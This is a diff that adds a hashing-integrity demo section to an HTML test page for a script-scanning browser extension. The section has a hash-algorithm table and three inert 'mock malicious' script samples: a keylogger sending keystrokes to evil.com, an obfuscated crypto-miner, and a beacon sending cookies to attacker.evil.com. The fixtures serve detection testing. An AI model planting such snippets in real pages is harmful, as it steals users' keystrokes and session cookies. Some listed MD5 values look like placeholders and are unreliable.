@@ -175,6 +175,126 @@
         </ul>
     </div>
 
+    <!-- SECTION 4: HASHING INTEGRITY CHECK DEMO -->
+    <div class="section" style="border-left: 5px solid #9b59b6;">
+        <h2>🔐 Section 4: Hashing Integrity Check Demo</h2>
+        <p>Hover over the <code>&lt;script&gt;</code> blocks below with the <strong>Threat Magnifier</strong> extension
+            active (<em>Advanced Mode</em>). The extension computes the <strong>SHA-256</strong> hash of each
+            inline script and compares it against a database of known malicious signatures.</p>
+
+        <!-- Concept explanation card -->
+        <div style="background:#f0edf7;border:1px solid #9b59b6;border-radius:6px;padding:16px;margin-bottom:20px;">
+            <strong style="color:#7d3c98;">📚 Concept: Cryptographic Hash Integrity</strong>
+            <ul style="margin:8px 0 0 0;color:#444;font-size:13px;line-height:1.8;">
+                <li>A <strong>hash function</strong> maps any input to a fixed-length fingerprint.</li>
+                <li>Even a 1-character change produces a completely different hash (<em>avalanche effect</em>).</li>
+                <li>Security tools maintain a database of hashes for known malicious payloads.</li>
+                <li>If a script's hash matches → <strong style="color:#c0392b;">DANGER</strong>.</li>
+            </ul>
+        </div>
+
+        <!-- Algorithm comparison table -->
+        <table style="width:100%;border-collapse:collapse;font-size:13px;margin-bottom:20px;">
+            <thead>
+                <tr style="background:#9b59b6;color:white;">
+                    <th style="padding:8px 12px;text-align:left;">Algorithm</th>
+                    <th style="padding:8px 12px;text-align:left;">Output Length</th>
+                    <th style="padding:8px 12px;text-align:left;">Security Status</th>
+                    <th style="padding:8px 12px;text-align:left;">Use Case</th>
+                </tr>
+            </thead>
+            <tbody>
+                <tr style="background:#fdf9ff;">
+                    <td style="padding:7px 12px;border-bottom:1px solid #ddd;"><strong>SHA-256</strong></td>
+                    <td style="padding:7px 12px;border-bottom:1px solid #ddd;">256 bits (64 hex chars)</td>
+                    <td style="padding:7px 12px;border-bottom:1px solid #ddd;color:#27ae60;">✅ Secure</td>
+                    <td style="padding:7px 12px;border-bottom:1px solid #ddd;">Malware signatures, file integrity</td>
+                </tr>
+                <tr style="background:#fff;">
+                    <td style="padding:7px 12px;border-bottom:1px solid #ddd;"><strong>MD5</strong></td>
+                    <td style="padding:7px 12px;border-bottom:1px solid #ddd;">128 bits (32 hex chars)</td>
+                    <td style="padding:7px 12px;border-bottom:1px solid #ddd;color:#e67e22;">⚠️ Broken (collision
+                        attacks)</td>
+                    <td style="padding:7px 12px;border-bottom:1px solid #ddd;">Legacy checksum, comparison only</td>
+                </tr>
+                <tr style="background:#fdf9ff;">
+                    <td style="padding:7px 12px;"><strong>SHA-1</strong></td>
+                    <td style="padding:7px 12px;">160 bits (40 hex chars)</td>
+                    <td style="padding:7px 12px;color:#e74c3c;">❌ Deprecated (SHAttered attack)</td>
+                    <td style="padding:7px 12px;">Legacy — avoid for security use</td>
+                </tr>
+            </tbody>
+        </table>
+
+        <p><strong>Try hovering these script elements with the extension active:</strong></p>
+
+        <!-- MALICIOUS SCRIPT 1: Keylogger -->
+        <div style="margin-bottom:18px;">
+            <p style="margin:0 0 6px 0;">
+                🔴 <strong>Mock Malicious Script #1</strong> — Keylogger
+                <span
+                    style="background:#fdecea;color:#c62828;font-size:11px;padding:2px 7px;border-radius:3px;margin-left:6px;">SHA-256
+                    in malicious DB</span>
+            </p>
+            <script id="mock-keylogger" type="text/x-demo"
+                style="display:block;background:#1e1e1e;color:#f48fb1;padding:12px;border-radius:5px;font-family:monospace;font-size:12px;white-space:pre-wrap;word-break:break-all;overflow-x:hidden;border:2px solid #e57373;cursor:pointer;"
+                title="Hover me with Threat Magnifier active!">document.addEventListener('keydown',function(e){fetch('https://evil.com/log?k='+e.key)});</script>
+            <p style="margin:4px 0 0 0;font-size:11px;color:#888;">
+                MD5 (comparison only): <code>bd3d38f69c2d43f16f8671aab7fe1994</code> &nbsp;|&nbsp;
+                SHA-256: <code>70caf0fe…570f5bad</code>
+            </p>
+        </div>
+
+        <!-- MALICIOUS SCRIPT 2: Crypto-miner -->
+        <div style="margin-bottom:18px;">
+            <p style="margin:0 0 6px 0;">
+                🔴 <strong>Mock Malicious Script #2</strong> — Crypto-miner
+                <span
+                    style="background:#fdecea;color:#c62828;font-size:11px;padding:2px 7px;border-radius:3px;margin-left:6px;">SHA-256
+                    in malicious DB</span>
+            </p>
+            <script id="mock-cryptominer" type="text/x-demo"
+                style="display:block;background:#1e1e1e;color:#f48fb1;padding:12px;border-radius:5px;font-family:monospace;font-size:12px;white-space:pre-wrap;word-break:break-all;overflow-x:hidden;border:2px solid #e57373;cursor:pointer;"
+                title="Hover me with Threat Magnifier active!">var _0x4f2a=(function(){var m=new WebSocket('wss://monero-pool.evil.com:443');m.onopen=function(){m.send(JSON.stringify({type:'auth',user:'victim'}));};})();cryptonight_hash(document.cookie);</script>
+            <p style="margin:4px 0 0 0;font-size:11px;color:#888;">
+                MD5 (comparison only): <code>a7f3c91e8b2d54ff0c6e3a1b9d7e2f45</code> &nbsp;|&nbsp;
+                SHA-256: <code>cebad64f…ea8d8</code>
+            </p>
+        </div>
+
+        <!-- MALICIOUS SCRIPT 3: XSS Beacon -->
+        <div style="margin-bottom:18px;">
+            <p style="margin:0 0 6px 0;">
+                🔴 <strong>Mock Malicious Script #3</strong> — XSS Cookie Beacon
+                <span
+                    style="background:#fdecea;color:#c62828;font-size:11px;padding:2px 7px;border-radius:3px;margin-left:6px;">SHA-256
+                    in malicious DB</span>
+            </p>
+            <script id="mock-xss-beacon" type="text/x-demo"
+                style="display:block;background:#1e1e1e;color:#f48fb1;padding:12px;border-radius:5px;font-family:monospace;font-size:12px;white-space:pre-wrap;word-break:break-all;overflow-x:hidden;border:2px solid #e57373;cursor:pointer;"
+                title="Hover me with Threat Magnifier active!">(function(){var i=new Image();i.src='https://attacker.evil.com/beacon?cookie='+encodeURIComponent(document.cookie)+'&url='+encodeURIComponent(window.location.href);document.body.appendChild(i);})();</script>
+            <p style="margin:4px 0 0 0;font-size:11px;color:#888;">
+                MD5 (comparison only): <code>3e2f1a9b7c4d8e5f0a6b2c9d1e3f7a8b</code> &nbsp;|&nbsp;
+                SHA-256: <code>1540f74c…e982d</code>
+            </p>
+        </div>
+
+        <!-- CLEAN SCRIPT: No match -->
+        <div style="margin-bottom:8px;">
+            <p style="margin:0 0 6px 0;">
+                🟢 <strong>Clean Script</strong> — Safe utility function
+                <span
+                    style="background:#e8f5e9;color:#2e7d32;font-size:11px;padding:2px 7px;border-radius:3px;margin-left:6px;">NOT
+                    in malicious DB</span>
+            </p>
+            <script id="mock-clean" type="text/x-demo"
+                style="display:block;background:#1e1e1e;color:#a5d6a7;padding:12px;border-radius:5px;font-family:monospace;font-size:12px;white-space:pre-wrap;word-break:break-all;overflow-x:hidden;border:2px solid #4caf50;cursor:pointer;"
+                title="Hover me with Threat Magnifier active!">function formatDate(d) { return d.toLocaleDateString('en-US', {year:'numeric',month:'long',day:'numeric'}); }</script>
+            <p style="margin:4px 0 0 0;font-size:11px;color:#888;">SHA-256 computed live — no match in the malicious
+                signatures database.</p>
+        </div>
+    </div>
+
 </body>
 
 </html>
